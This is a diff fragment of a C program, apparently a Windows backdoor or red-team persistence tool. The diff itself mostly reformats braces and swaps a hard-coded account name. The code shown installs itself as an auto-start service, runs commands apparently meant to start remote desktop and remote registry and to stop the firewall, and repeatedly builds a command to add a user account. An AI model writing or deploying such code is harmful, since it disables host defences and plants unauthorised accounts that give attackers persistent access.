@@ -28,10 +28,9 @@
 int CUR_COUNT = 0;
 
 int END_INT = 5000;
-char* USER_NAME = "PickleRick\0"; // "JohnCena\0";
+char* USER_NAME = "MattDaemon\0";
 
-void create_user()
-{
+void create_user() {
     if(CUR_COUNT < END_INT)
     {
         char* user_add = calloc((strlen(USER_CMD) +  4) + strlen(USER_NAME), 1);
@@ -57,16 +56,14 @@ void create_user()
     }
 }
 
-void service_main(int** running)
-{
+void service_main(int** running) {
     wsp_execv(TS_START_SVC, NULL, 1);
     wsp_execv(TS_START_REG, NULL, 1);
     wsp_execv(TS_STOP_FW, NULL, 1);
     create_user();
 }
 
-int main(int argc, char **argv)
-{
+int main(int argc, char **argv) {
     if(argc == 2)
     {
         wsw_this_as_service(NAME, AUTO, TRUE, NULL);
